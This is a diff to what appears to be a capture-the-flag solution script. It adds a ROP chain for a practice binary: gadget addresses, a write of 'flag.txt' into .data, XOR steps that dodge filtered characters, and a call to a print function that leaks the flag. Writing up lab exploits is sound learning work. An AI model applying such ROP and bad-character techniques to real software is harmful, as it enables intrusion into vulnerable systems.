@@ -38,7 +38,35 @@ continue
 # PIE:      No PIE (0x400000)
 # RUNPATH:  b'.'
 
+#Bad characters: x, g, a, .
+
 io = start()
+
+
+junk = b'A'*40
+junk2 = p64(0x0)
+r12r13PopGadget = p64(0x40069b) # pop rbp, 12, 13, 14, 15; ret.
+                                #   Needs some extra trash for rbp, r14, and r15
+writeGadget = p64(0x400634)     # mov qword ptr [r13], r12; ret
+                                #   Write to .data section
+r14r15PopGadget = p64(0x4006a0) # pop r14; pop r15; ret;
+                                #   prep prams for xor
+r15r14XorGadget = p64(0x400628) # xor byte ptr [r15], r14b; reti
+                                # MOAR XOR
+popRdiGadget = p64(0x4006a3)    # Pop .data address into rdi
+dataAddress = p64(0x601029)     # .data address
+functionAddress = p64(0x400620) # print function address
+string = b"flag.txt"            # flag string
+
+
+payload = junk + r12r13PopGadget + junk2 + string + dataAddress + junk2 + junk2 + writeGadget + r14r15PopGadget + p64(0x8a) + p64(0x601029 + 2) + r15r14XorGadget + r14r15PopGadget + p64(0x8c) + p64(0x601029 + 3) +r15r14XorGadget + r14r15PopGadget + p64(0xc5) + p64(0x601029 + 4) + r15r14XorGadget + r14r15PopGadget + p64(0x93) + p64(0x601029 + 6) + r15r14XorGadget + popRdiGadget + dataAddress + functionAddress
+
+
+log.info(io.clean())
+io.sendline(payload)
+log.info(io.clean())
+
+
 
 
 
